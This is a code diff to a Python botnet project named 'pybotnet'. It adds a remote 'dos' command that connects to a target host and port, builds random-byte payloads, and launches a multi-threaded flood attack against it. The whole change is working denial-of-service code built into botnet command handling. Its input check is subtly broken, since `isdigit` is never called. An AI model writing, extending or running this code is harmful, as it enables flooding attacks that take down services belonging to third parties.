@@ -13,6 +13,7 @@ import sys
 from playsound import playsound
 import webbrowser
 import socket
+import random
 
 
 # pybotnet import
@@ -555,7 +556,44 @@ def dos(logger,command):
     port = splitted_command[2]
     thread_num = splitted_command[3]
     payload = splitted_command[4]
-    time = splitted_command[5]
+    howmany = splitted_command[5]
+    if all(var.isdigit for var in [port,thread_num,payload,howmany]) and isinstance(
+        target,str
+        ):
+        pass
+    else:
+        logger.error("Data was not correct.")
+        return "Data was not correct."
+    try:
+        logger.info(f"Checking IP {target} on port {port}")
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
+        s.connect((target, port))
+    except:
+        logger.error(f"IP {target} on port {port} failed.")
+        return f"IP {target} on port {port} failed."
+
+    else:
+        try:
+            payload = random._urandom(int(payload))
+        except:
+            logger.error("Payload too big. Aborting.")
+            return "Payload too big , try smaller payloads."
+        else:
+            logger.info("Starting Dos Attack...")
+            dos = util.dos(
+                target,int(port),payload,int(howmany)
+            )
+            for i in range(int(thread_num)):
+                thread = threading.Thread(target=dos.attack)
+                thread.start()
+
+            return "Dos Attack Done."
+
+
+            
+        
+
+
 
 
 
